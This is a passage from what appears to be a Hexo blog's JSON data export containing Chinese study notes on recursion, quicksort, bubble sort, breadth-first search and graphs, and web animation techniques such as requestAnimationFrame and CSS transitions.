title=\"场景\"></a>场景</h3><blockquote>\n<p>给定一个数组[2,4,6]，然后相加，并返回结果，不使用循环</p>\n</blockquote>\n<ul>\n<li>第一步找到基线条件，最简单的数组是怎样的？如果数组不包含一个元素或者只有一个元素，那么计算总和就容易了，这就是基线条件</li>\n<li>每次递归调用都必须离空数组更近</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sum</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (arr.length == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr[<span class=\"number\">0</span>];</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//别忘了递归记录了状态</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr.shift() + sum(arr);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"快速排序\"><a href=\"#快速排序\" class=\"headerlink\" title=\"快速排序\"></a>快速排序</h2><blockquote>\n<p>使用快排对数组进行排序</p>\n</blockquote>\n<ul>\n<li>对于排序算法来说，最简单的数组是怎么样的？没错，就是根本不需要排序的一个元素的数组或者空数组</li>\n</ul>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><blockquote>\n<p>[33,15,10]</p>\n</blockquote>\n<ul>\n<li>\b 首先在数组中选择一个元素，这个元素被称为基准值（pivot），等等介绍如何选择合适的基准值，这里选择第一个元素 33</li>\n<li>找出比基准值小的元素和比他大的元素，这叫分区</li>\n<li>现在我有：一个由所有小于基准值的数字组成的子数组，基准值，一个由所有大于基准值的数字组成的子数组</li>\n<li>然后再对子数组进行排序，然后合并结果就能得到有序数组：quicksort([15,10])+[33]+quicksort([])</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">quicksort</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (arr.length &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//基线条件：为空或者包含一个元素的数组有序</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> pivot = arr[<span class=\"number\">0</span>]; <span class=\"comment\">//递归条件</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> less = [],</span><br><span class=\"line\">      greater = [];</span><br><span class=\"line\">    <span class=\"comment\">//子数组</span></span><br><span class=\"line\">    arr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (item &lt; pivot) &#123;</span><br><span class=\"line\">        less.push(item);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (item &gt; pivot) &#123;</span><br><span class=\"line\">        greater.push(item);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [...quicksort(less), pivot, ...quicksort(greater)];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"最糟情况和平均情况\"><a href=\"#最糟情况和平均情况\" class=\"headerlink\" title=\"最糟情况和平均情况\"></a>最糟情况和平均情况</h3><ul>\n<li><p>平均情况下是 O（n*logn）</p>\n<blockquote>\n<p>有一种算法叫合并排序也是这个，但是为什么不用这个呢，是因为大 O 表示法有个常量（也被叫做固定时间量）被省去了，如果两个算法的大 O 运行时间不一样，那么常量无关紧要，参考简单查找和二分查找。如果一样的话，那么常量的影响非常大。两个函数，后面那个我每读一个元素，睡一秒种，但是其实两个函数速度一样，但是前面所需的时间更少。同理可得，快排所需的时间更少，而且相对于遇上最糟情况，它遇上平均情况的可能性大得多。</p>\n</blockquote>\n</li>\n<li><p>最糟糕就是与选择排序一样慢，O（n^2）</p>\n</li>\n</ul>\n<h4 id=\"场景-1\"><a href=\"#场景-1\" class=\"headerlink\" title=\"场景\"></a>场景</h4><ul>\n<li>比如[1,2,3,4,5,6,7]</li>\n<li>如果从第一个数作为基准值，数组没有被切成两半，这将导致调用栈很长，栈长 n 个，而且最上面那层都涉及 n 个元素，然后类推 n-1 个元素，最终得出 n*n*1/2 个操作，去掉常数，也就是 n^2</li>\n<li>如果总是将中间的元素作为基准值，数组分成两半，最佳情况下,栈长为 logn 个,然后每次也是涉及 O（n）个元素（去掉常量），也就是 n*logn。而且最佳情况也是平均情况，只要每次随机地选择一个数组元素作为基准值，那么平均运行时间就是 O（nlogn）</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">quicksort</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (arr.length &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//基线条件：为空或者包含一个元素的数组有序</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//随机选择索引</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> index = randomNum(<span class=\"number\">0</span>, arr.length - <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> pivot = arr[index]; <span class=\"comment\">//递归条件</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> less = [],</span><br><span class=\"line\">      greater = [];</span><br><span class=\"line\">    <span class=\"comment\">//子数组</span></span><br><span class=\"line\">    arr.forEach(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (item &lt; pivot) &#123;</span><br><span class=\"line\">        less.push(item);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (item &gt; pivot) &#123;</span><br><span class=\"line\">        greater.push(item);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [...quicksort(less), pivot, ...quicksort(greater)];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//随机数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">randomNum</span>(<span class=\"params\">minNum, maxNum</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">switch</span> (<span class=\"built_in\">arguments</span>.length) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">parseInt</span>(<span class=\"built_in\">Math</span>.random() * minNum + <span class=\"number\">1</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">parseInt</span>(<span class=\"built_in\">Math</span>.random() * (maxNum - minNum + <span class=\"number\">1</span>) + minNum, <span class=\"number\">10</span>);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"说一下冒泡排序\"><a href=\"#说一下冒泡排序\" class=\"headerlink\" title=\"说一下冒泡排序\"></a>说一下冒泡排序</h2><blockquote>\n<p>想象一下一个个冒泡上来，第一次遍历，第一个跟接下来的比较，如果比他大就换位置，一圈完事后。到第二个，跟接下来的换位置。</p>\n</blockquote>\n<ul>\n<li>运行时是 O（n^2）</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">bubbleSort</span>(<span class=\"params\">arr</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> j = i + <span class=\"number\">1</span>; j &lt; arr.length; j++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (arr[i] &gt; arr[j]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> temp = arr[i];</span><br><span class=\"line\">        arr[i] = arr[j];</span><br><span class=\"line\">        arr[j] = temp;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(arr);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"读《图解算法》05-广度优先搜索","date":"2018-05-27T08:43:09.000Z","_content":"\n# 广度优先算法简单介绍\n\n> breadth-first search ，以下简称 BFS\n\n* 能让你找出两样东西之间的最短距离，不过最短距离的含义有很多。\n\n## 可以干什么（感受一下多强大）\n\n* 编写国际跳棋 AI，计算最少走多少就可以获胜\n* 根据人际关系网络找到关系最近的医生\n\n## 可以回答两类问题\n\n* 从节点 A 出发，有前往节点 B 的途径吗\n* 从节点 a 出发，前往节点 b 的路径哪条最短\n\n## 如何实现\n\n* 创建一个队列，存储要检查的人\n* 从队列弹出一个人，检查这个人是否是想要的，不是的话，把这个人的邻居加入队列\n* 假设队列里面肯定有重复的，所以要将检查的人标记，不能检查两次，不然会出现无限循环的情况\n* 可以专门存一个数组来记录检查过的人，或者用散列表存储，本质去掉重复\n\n## 运行时间\n\n* 在整个人际关系网找到正确的，意味着要沿每条边前行，因此运行时间为 O(n)\n* 还使用了队列，其中要包含每个检查的人。将一个人添加到队列是 O（1），n 个人就是 O（n）\n* 所以运行时间通常为 O(V+E)，v 为定点数，e 为边数\n\n# 图\n\n## 简介\n\n> 想象以下场景\n\n* 从我家到公园，需要几步，求最短路径\n* 一个欠钱的关系图，几个人之间的\n\n## 组成\n\n* 图是由节点和边组成。\n* 图用于模拟不同的东西是如何相连的\n\n### 有向图和无向图\n\n* 有向图的关系是单向的，从节点 a 到节点 b，但不能反过来\n* 无向图直接相连\n\n## 查找算法\n\n* 有序列表的查找算法有二分法，同样，图的查找算法是广度优先搜索\n\n## 如何实现图\n\n* 因为图是由多个节点组成，每个节点都与邻近节点相连，怎么表示我->bob 这样的关系，可以使用散列表，将 key 映射到 value\n* 这里我们将节点映射到所有邻居\n* 图不过是一系列的节点和边的组合\n\n```javascript\nlet graph = {};\ngraph[\"me\"] = [\"alice\", \"bob\"];\ngraph[\"bob\"] = [\"peggy\"];\ngraph[\"alice\"] = [\"peggy\"];\ngraph[\"peggy\"] = [];\n```\n\n# 队列\n\n> 和生活中的队列完全一样\n\n* 是一个先进先出的数据结构\n* 队列只支持两种操作：入队和出队\n\n# 树\n\n> 特殊的图，没有往后指的边，自上而下\n\n* 假设正在规划一场婚礼，并有一个很大的图\n* 其中充满着需要做的事，但是却不知道从何开始\n* 可以使用拓扑排序来创建一个有序列表\n","source":"_posts/study-breadth-first-search.md","raw":"---\ntitle: 读《图解算法》05-广度优先搜索\ndate: 2018-05-27 16:43:09\ntags: 图解算法\n---\n\n# 广度优先算法简单介绍\n\n> breadth-first search ，以下简称 BFS\n\n* 能让你找出两样东西之间的最短距离，不过最短距离的含义有很多。\n\n## 可以干什么（感受一下多强大）\n\n* 编写国际跳棋 AI，计算最少走多少就可以获胜\n* 根据人际关系网络找到关系最近的医生\n\n## 可以回答两类问题\n\n* 从节点 A 出发，有前往节点 B 的途径吗\n* 从节点 a 出发，前往节点 b 的路径哪条最短\n\n## 如何实现\n\n* 创建一个队列，存储要检查的人\n* 从队列弹出一个人，检查这个人是否是想要的，不是的话，把这个人的邻居加入队列\n* 假设队列里面肯定有重复的，所以要将检查的人标记，不能检查两次，不然会出现无限循环的情况\n* 可以专门存一个数组来记录检查过的人，或者用散列表存储，本质去掉重复\n\n## 运行时间\n\n* 在整个人际关系网找到正确的，意味着要沿每条边前行，因此运行时间为 O(n)\n* 还使用了队列，其中要包含每个检查的人。将一个人添加到队列是 O（1），n 个人就是 O（n）\n* 所以运行时间通常为 O(V+E)，v 为定点数，e 为边数\n\n# 图\n\n## 简介\n\n> 想象以下场景\n\n* 从我家到公园，需要几步，求最短路径\n* 一个欠钱的关系图，几个人之间的\n\n## 组成\n\n* 图是由节点和边组成。\n* 图用于模拟不同的东西是如何相连的\n\n### 有向图和无向图\n\n* 有向图的关系是单向的，从节点 a 到节点 b，但不能反过来\n* 无向图直接相连\n\n## 查找算法\n\n* 有序列表的查找算法有二分法，同样，图的查找算法是广度优先搜索\n\n## 如何实现图\n\n* 因为图是由多个节点组成，每个节点都与邻近节点相连，怎么表示我->bob 这样的关系，可以使用散列表，将 key 映射到 value\n* 这里我们将节点映射到所有邻居\n* 图不过是一系列的节点和边的组合\n\n```javascript\nlet graph = {};\ngraph[\"me\"] = [\"alice\", \"bob\"];\ngraph[\"bob\"] = [\"peggy\"];\ngraph[\"alice\"] = [\"peggy\"];\ngraph[\"peggy\"] = [];\n```\n\n# 队列\n\n> 和生活中的队列完全一样\n\n* 是一个先进先出的数据结构\n* 队列只支持两种操作：入队和出队\n\n# 树\n\n> 特殊的图，没有往后指的边，自上而下\n\n* 假设正在规划一场婚礼，并有一个很大的图\n* 其中充满着需要做的事，但是却不知道从何开始\n* 可以使用拓扑排序来创建一个有序列表\n","slug":"study-breadth-first-search","published":1,"updated":"2018-05-27T11:45:59.823Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034kg001g0iof569o4iwu","content":"<h1 id=\"广度优先算法简单介绍\"><a href=\"#广度优先算法简单介绍\" class=\"headerlink\" title=\"广度优先算法简单介绍\"></a>广度优先算法简单介绍</h1><blockquote>\n<p>breadth-first search ，以下简称 BFS</p>\n</blockquote>\n<ul>\n<li>能让你找出两样东西之间的最短距离，不过最短距离的含义有很多。</li>\n</ul>\n<h2 id=\"可以干什么（感受一下多强大）\"><a href=\"#可以干什么（感受一下多强大）\" class=\"headerlink\" title=\"可以干什么（感受一下多强大）\"></a>可以干什么（感受一下多强大）</h2><ul>\n<li>编写国际跳棋 AI，计算最少走多少就可以获胜</li>\n<li>根据人际关系网络找到关系最近的医生</li>\n</ul>\n<h2 id=\"可以回答两类问题\"><a href=\"#可以回答两类问题\" class=\"headerlink\" title=\"可以回答两类问题\"></a>可以回答两类问题</h2><ul>\n<li>从节点 A 出发，有前往节点 B 的途径吗</li>\n<li>从节点 a 出发，前往节点 b 的路径哪条最短</li>\n</ul>\n<h2 id=\"如何实现\"><a href=\"#如何实现\" class=\"headerlink\" title=\"如何实现\"></a>如何实现</h2><ul>\n<li>创建一个队列，存储要检查的人</li>\n<li>从队列弹出一个人，检查这个人是否是想要的，不是的话，把这个人的邻居加入队列</li>\n<li>假设队列里面肯定有重复的，所以要将检查的人标记，不能检查两次，不然会出现无限循环的情况</li>\n<li>可以专门存一个数组来记录检查过的人，或者用散列表存储，本质去掉重复</li>\n</ul>\n<h2 id=\"运行时间\"><a href=\"#运行时间\" class=\"headerlink\" title=\"运行时间\"></a>运行时间</h2><ul>\n<li>在整个人际关系网找到正确的，意味着要沿每条边前行，因此运行时间为 O(n)</li>\n<li>还使用了队列，其中要包含每个检查的人。将一个人添加到队列是 O（1），n 个人就是 O（n）</li>\n<li>所以运行时间通常为 O(V+E)，v 为定点数，e 为边数</li>\n</ul>\n<h1 id=\"图\"><a href=\"#图\" class=\"headerlink\" title=\"图\"></a>图</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><blockquote>\n<p>想象以下场景</p>\n</blockquote>\n<ul>\n<li>从我家到公园，需要几步，求最短路径</li>\n<li>一个欠钱的关系图，几个人之间的</li>\n</ul>\n<h2 id=\"组成\"><a href=\"#组成\" class=\"headerlink\" title=\"组成\"></a>组成</h2><ul>\n<li>图是由节点和边组成。</li>\n<li>图用于模拟不同的东西是如何相连的</li>\n</ul>\n<h3 id=\"有向图和无向图\"><a href=\"#有向图和无向图\" class=\"headerlink\" title=\"有向图和无向图\"></a>有向图和无向图</h3><ul>\n<li>有向图的关系是单向的，从节点 a 到节点 b，但不能反过来</li>\n<li>无向图直接相连</li>\n</ul>\n<h2 id=\"查找算法\"><a href=\"#查找算法\" class=\"headerlink\" title=\"查找算法\"></a>查找算法</h2><ul>\n<li>有序列表的查找算法有二分法，同样，图的查找算法是广度优先搜索</li>\n</ul>\n<h2 id=\"如何实现图\"><a href=\"#如何实现图\" class=\"headerlink\" title=\"如何实现图\"></a>如何实现图</h2><ul>\n<li>因为图是由多个节点组成，每个节点都与邻近节点相连，怎么表示我-&gt;bob 这样的关系，可以使用散列表，将 key 映射到 value</li>\n<li>这里我们将节点映射到所有邻居</li>\n<li>图不过是一系列的节点和边的组合</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> graph = &#123;&#125;;</span><br><span class=\"line\">graph[<span class=\"string\">\"me\"</span>] = [<span class=\"string\">\"alice\"</span>, <span class=\"string\">\"bob\"</span>];</span><br><span class=\"line\">graph[<span class=\"string\">\"bob\"</span>] = [<span class=\"string\">\"peggy\"</span>];</span><br><span class=\"line\">graph[<span class=\"string\">\"alice\"</span>] = [<span class=\"string\">\"peggy\"</span>];</span><br><span class=\"line\">graph[<span class=\"string\">\"peggy\"</span>] = [];</span><br></pre></td></tr></table></figure>\n<h1 id=\"队列\"><a href=\"#队列\" class=\"headerlink\" title=\"队列\"></a>队列</h1><blockquote>\n<p>和生活中的队列完全一样</p>\n</blockquote>\n<ul>\n<li>是一个先进先出的数据结构</li>\n<li>队列只支持两种操作：入队和出队</li>\n</ul>\n<h1 id=\"树\"><a href=\"#树\" class=\"headerlink\" title=\"树\"></a>树</h1><blockquote>\n<p>特殊的图，没有往后指的边，自上而下</p>\n</blockquote>\n<ul>\n<li>假设正在规划一场婚礼，并有一个很大的图</li>\n<li>其中充满着需要做的事，但是却不知道从何开始</li>\n<li>可以使用拓扑排序来创建一个有序列表</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"广度优先算法简单介绍\"><a href=\"#广度优先算法简单介绍\" class=\"headerlink\" title=\"广度优先算法简单介绍\"></a>广度优先算法简单介绍</h1><blockquote>\n<p>breadth-first search ，以下简称 BFS</p>\n</blockquote>\n<ul>\n<li>能让你找出两样东西之间的最短距离，不过最短距离的含义有很多。</li>\n</ul>\n<h2 id=\"可以干什么（感受一下多强大）\"><a href=\"#可以干什么（感受一下多强大）\" class=\"headerlink\" title=\"可以干什么（感受一下多强大）\"></a>可以干什么（感受一下多强大）</h2><ul>\n<li>编写国际跳棋 AI，计算最少走多少就可以获胜</li>\n<li>根据人际关系网络找到关系最近的医生</li>\n</ul>\n<h2 id=\"可以回答两类问题\"><a href=\"#可以回答两类问题\" class=\"headerlink\" title=\"可以回答两类问题\"></a>可以回答两类问题</h2><ul>\n<li>从节点 A 出发，有前往节点 B 的途径吗</li>\n<li>从节点 a 出发，前往节点 b 的路径哪条最短</li>\n</ul>\n<h2 id=\"如何实现\"><a href=\"#如何实现\" class=\"headerlink\" title=\"如何实现\"></a>如何实现</h2><ul>\n<li>创建一个队列，存储要检查的人</li>\n<li>从队列弹出一个人，检查这个人是否是想要的，不是的话，把这个人的邻居加入队列</li>\n<li>假设队列里面肯定有重复的，所以要将检查的人标记，不能检查两次，不然会出现无限循环的情况</li>\n<li>可以专门存一个数组来记录检查过的人，或者用散列表存储，本质去掉重复</li>\n</ul>\n<h2 id=\"运行时间\"><a href=\"#运行时间\" class=\"headerlink\" title=\"运行时间\"></a>运行时间</h2><ul>\n<li>在整个人际关系网找到正确的，意味着要沿每条边前行，因此运行时间为 O(n)</li>\n<li>还使用了队列，其中要包含每个检查的人。将一个人添加到队列是 O（1），n 个人就是 O（n）</li>\n<li>所以运行时间通常为 O(V+E)，v 为定点数，e 为边数</li>\n</ul>\n<h1 id=\"图\"><a href=\"#图\" class=\"headerlink\" title=\"图\"></a>图</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><blockquote>\n<p>想象以下场景</p>\n</blockquote>\n<ul>\n<li>从我家到公园，需要几步，求最短路径</li>\n<li>一个欠钱的关系图，几个人之间的</li>\n</ul>\n<h2 id=\"组成\"><a href=\"#组成\" class=\"headerlink\" title=\"组成\"></a>组成</h2><ul>\n<li>图是由节点和边组成。</li>\n<li>图用于模拟不同的东西是如何相连的</li>\n</ul>\n<h3 id=\"有向图和无向图\"><a href=\"#有向图和无向图\" class=\"headerlink\" title=\"有向图和无向图\"></a>有向图和无向图</h3><ul>\n<li>有向图的关系是单向的，从节点 a 到节点 b，但不能反过来</li>\n<li>无向图直接相连</li>\n</ul>\n<h2 id=\"查找算法\"><a href=\"#查找算法\" class=\"headerlink\" title=\"查找算法\"></a>查找算法</h2><ul>\n<li>有序列表的查找算法有二分法，同样，图的查找算法是广度优先搜索</li>\n</ul>\n<h2 id=\"如何实现图\"><a href=\"#如何实现图\" class=\"headerlink\" title=\"如何实现图\"></a>如何实现图</h2><ul>\n<li>因为图是由多个节点组成，每个节点都与邻近节点相连，怎么表示我-&gt;bob 这样的关系，可以使用散列表，将 key 映射到 value</li>\n<li>这里我们将节点映射到所有邻居</li>\n<li>图不过是一系列的节点和边的组合</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> graph = &#123;&#125;;</span><br><span class=\"line\">graph[<span class=\"string\">\"me\"</span>] = [<span class=\"string\">\"alice\"</span>, <span class=\"string\">\"bob\"</span>];</span><br><span class=\"line\">graph[<span class=\"string\">\"bob\"</span>] = [<span class=\"string\">\"peggy\"</span>];</span><br><span class=\"line\">graph[<span class=\"string\">\"alice\"</span>] = [<span class=\"string\">\"peggy\"</span>];</span><br><span class=\"line\">graph[<span class=\"string\">\"peggy\"</span>] = [];</span><br></pre></td></tr></table></figure>\n<h1 id=\"队列\"><a href=\"#队列\" class=\"headerlink\" title=\"队列\"></a>队列</h1><blockquote>\n<p>和生活中的队列完全一样</p>\n</blockquote>\n<ul>\n<li>是一个先进先出的数据结构</li>\n<li>队列只支持两种操作：入队和出队</li>\n</ul>\n<h1 id=\"树\"><a href=\"#树\" class=\"headerlink\" title=\"树\"></a>树</h1><blockquote>\n<p>特殊的图，没有往后指的边，自上而下</p>\n</blockquote>\n<ul>\n<li>假设正在规划一场婚礼，并有一个很大的图</li>\n<li>其中充满着需要做的事，但是却不知道从何开始</li>\n<li>可以使用拓扑排序来创建一个有序列表</li>\n</ul>\n"},{"title":"动画了解一下(一)","date":"2017-11-23T06:32:05.000Z","_content":"\n> 笼统的过一下动画的一些基本概念\n\n## 基本概念\n\n* 帧：在动画过程中，每一幅静止画面即为一“帧”\n* 帧率：即每秒播放的静止画面的数量，单位是 fps(frame per second)或赫兹(Hz)\n* 帧时长：即每一幅静止画面的停留时间，单位一般是毫秒\n* 丢帧：在帧率固定的动画中，某一帧的时长远高于平均帧时长，导致其后续帧被挤压而丢失的现象\n\n> 我们在显示器上看到的动画，每一帧变化都是系统绘制出来的（GPU 或者 CPU）。它的最高绘制频率受限于显示器的刷新频率（而非显卡，大多数都是 60Hz 或者 75Hz）\n\n帧率越高，屏幕上图片闪烁感就越小，稳定性也就越高。人的眼睛不容易察觉 75Hz 以上刷新频率带来的闪烁感。\n\n## 实现方式\n\n> * js：通过定时器（setTimeout 和 setInterval）来改变元素样式，或者使用 requestAnimationFrame\n> * css3:transition 和 animation\n> * html5:使用 html5 提供的绘图方式(canvas/svg/webgl)\n\n### requestAnimationFrame\n\n* 这个 api 是浏览器用于定时循环操作的一个接口，类似于 setTimeout,主要用途是按帧对网页进行重绘\n* 目的是为了让各种网页动画效果（dom 动画，canvas 动画，svg 动画，webgl 动画）能够有一个统一的刷新机制，从而节省系统资源，提供系统性能，改善视觉效果。\n* 代码中使用这个 api，就是告诉浏览器希望执行一个动画，让浏览器在动画帧安排一次重绘。\n* 其接受一个回调作为参数，这个回调函数会在浏览器重绘之前调用，由于功效只是一次性的，所以想实现连续的动效，需要递归调用。\n\n```javascript\n<div id=\"demo\" style=\"position:absolute; width:100px; height:100px; background:#ccc; left:0; top:0;\"></div>\n\n<script>\nvar demo = document.getElementById('demo');\nfunction render(){\n    demo.style.left = parseInt(demo.style.left) + 1 + 'px'; //每一帧向右移动1px\n}\nrequestAnimationFrame(function(){\n    render();\n    //当超过300px后才停止\n    if(parseInt(demo.style.left) <= 300) requestAnimationFrame(arguments.callee);\n});\n</script>\n```\n\n* cancelAnimationFrame 用于取消重绘\n\n```javascipt\nvar requestID = requestAnimationFrame(repeatOften);\ncancelAnimationFrame(requestID);\n```\n\n> 使用 requestAnimationFrame 的优势如下\n\n* 会把每一帧中的所有 dom 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随着显示器的刷新频率（60 或者 75Hz）\n* 在隐藏或不可见的元素中，将不会进行重绘或回流，这就意味着更少的 cpu，gpu 和内存使用量\n* 所以它是性能优化版/专为动画量身打造的 setTimeout，不同的是它不是自己指定回调函数运行的时间，而是跟着浏览器内建的刷新频率来执行回调，这就能达到浏览器所能实现动画的最佳效果\n\n### transition\n\n* css 中的 transition 属性允许块级元素中的属性在指定的时间内平滑的改变\n\n```javascript\ntransition:property duration timing-function delay\n```\n\n* property 是过渡效果的 css 属性的名称，比如 height\n* duration 规定完成过渡效果需要多少毫秒或者秒\n* timing-function 规定速度效果的曲线(linear/ease..)\n* delay 规定过渡效果何时开始\n\n### animation\n\n* 跟 transition 比较，作用于元素本身而不是样式属性,可以使用关键帧的概念，应该说可以实现更自由的动画效果\n\n```javascript\nanimation:name duration timing-function delay iteration-count direction\n```\n\n* name 是需要绑定到选择器的 keyframe 名称\n* duration 规定完成动画所花费的时间，以秒或者毫秒算\n* timing-function 是动画的速度曲线(line/ease..)\n* delay 规定在动画开始之前的延迟\n* iteration-count 规定动画应该播放的次数\n* animation-direction 规定是否应该轮流反向播放动画(normal/alternate)\n\n### Canvas\n\n* html5 新增的元素，作为页面图形绘制的容器，可用于使用 js 中的脚本来绘制图形。\n* 